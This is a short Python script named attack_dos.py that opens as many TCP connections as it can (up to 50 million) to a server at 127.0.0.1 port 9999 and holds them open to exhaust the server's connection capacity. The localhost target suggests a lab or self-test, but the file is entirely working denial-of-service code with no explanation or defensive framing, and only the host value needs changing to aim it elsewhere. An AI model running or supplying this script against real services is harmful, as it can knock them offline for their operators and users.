# attack_dos.py
import socket
import time

HOST, PORT = "127.0.0.1", 9999
MAX_CONN = 50000000

sockets = []
try:
    for i in range(MAX_CONN):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((HOST, PORT))
            s.recv(1024)
            sockets.append(s)
            if i % 50 == 0:
                print(f"  opened: {i}")
        except Exception as e:
            print(f"  [!] at {i}: {e}")
            break

    print(f"\n[+] Holding {len(sockets)} connections. Ctrl+C to exit.")
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[*] Closing...")
finally:
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
